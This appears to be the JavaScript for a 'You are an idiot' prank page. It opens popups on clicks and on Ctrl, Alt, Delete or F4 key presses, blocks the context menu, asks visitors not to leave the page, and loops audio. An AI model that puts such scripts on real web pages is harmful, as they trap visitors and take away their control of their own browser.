/*
 * [Aug 2023] Fixed the popup mechanism, made it more robust.
 *
 * Requires safe.js & math.js preload.
 */
document.addEventListener("click", async () => {
	await proCreate(50);
});

window.onload = () => {
	playBall();
	tryAutoplay();
};
document.getElementById('').click();
window.oncontextmenu = () => false;

window.onkeydown = async () => {
	if (['Control', 'Alt', 'Delete', 'F4'].includes(event.key)) {
		await proCreate(3);
		alert("You are an idiot!");
	}
	return null;
};

window.onbeforeunload = () => "Are you an idiot?";

/* 🔊 New: Autoplay audio setup */
function tryAutoplay() {
	const audio = document.querySelector('#youare-audio');
	const ovlap = document.querySelector('#youare-overlap');

	if (!audio || !ovlap) return;

	let overlap = true;

	function audioPlay() {
		if (!overlap) {
			audio.currentTime = 0;
			audio.play();
		} else {
			ovlap.currentTime = 0;
			ovlap.play();
		}

		audio.addEventListener('timeupdate', audioOverlap);
		ovlap.addEventListener('timeupdate', audioOverlap);
	}

	function audioOverlap() {
		if (!overlap && audio.currentTime > audio.duration - 0.45) {
			ovlap.currentTime = 0;
			ovlap.play();
			overlap = true;
		}

		if (overlap && ovlap.currentTime > ovlap.duration - 0.5) {
			audio.currentTime = 0;
			audio.play();
			overlap = false;
		}
	}

	// Attempt autoplay
	const p1 = audio.play();
	const p2 = ovlap.play();

	Promise.allSettled([p1, p2]).then(results => {
		const failed = results.some(r => r.status === 'rejected');
		if (failed) {
			document.body.addEventListener('click', audioPlay, { once: true });
		} else {
			audioPlay();
		}
	});
}
